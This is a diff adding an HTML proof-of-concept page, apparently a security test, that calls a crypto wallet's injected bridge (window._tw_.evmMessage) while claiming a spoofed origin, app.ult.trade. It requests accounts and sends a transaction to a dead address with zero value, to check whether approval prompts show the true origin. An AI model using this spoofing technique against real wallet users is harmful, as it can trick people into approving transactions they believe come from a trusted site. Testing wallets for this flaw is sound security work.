@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bridge Origin Test</title>
+<style>
+body{font-family:system-ui;background:#0b1220;color:#e8eefc;margin:0;padding:24px}
+.box{background:#141d33;border-radius:12px;padding:16px;margin-bottom:14px}
+#real{word-break:break-all}
+button{width:100%;padding:14px;border:0;border-radius:10px;font-size:16px;background:#4cdbff;color:#001;font-weight:700}
+button.alt{background:#ffd54d;margin-top:10px}
+small{color:#8fa3c8}
+</style>
+</head>
+<body>
+<div class="box">
+<b>REAL page origin:</b>
+<div id="real"></div>
+<small>This page is hosted on a third-party test domain. Any approval sheet that appears below should display THIS origin if the wallet validates it correctly.</small>
+</div>
+<button onclick="callBridge()">Request accounts (spoofed host: app.ult.trade)</button>
+<button class="alt" onclick="callBridgeSign()">Send tx (spoofed host: app.ult.trade)</button>
+<div class="box" id="out" style="display:none"></div>
+<script>
+document.getElementById('real').textContent = location.origin || location.href;
+function show(s){var o=document.getElementById('out');o.style.display='block';o.textContent=s}
+function callBridge(){
+  var json = {id: Date.now()%100000, jsonrpc:"2.0", name:"eth_requestAccounts", object:{}};
+  try{
+    window._tw_.evmMessage("Ult Security", "https://app.ult.trade", JSON.stringify(json), "0x1");
+    show("called _tw_.evmMessage with host=https://app.ult.trade");
+  }catch(e){ show("bridge error: "+e) }
+}
+function callBridgeSign(){
+  var json = {id: Date.now()%100000+1, jsonrpc:"2.0", name:"eth_sendTransaction",
+    object:{chainId:"0x1"},
+    to:"0x000000000000000000000000000000000000dEaD",
+    value:"0x0", data:"0x"};
+  try{
+    window._tw_.evmMessage("Ult Security", "https://app.ult.trade", JSON.stringify(json), "0x1");
+    show("called _tw_.evmMessage (sendTransaction) with host=https://app.ult.trade");
+  }catch(e){ show("bridge error: "+e) }
+}
+</script>
+</body>
+</html>
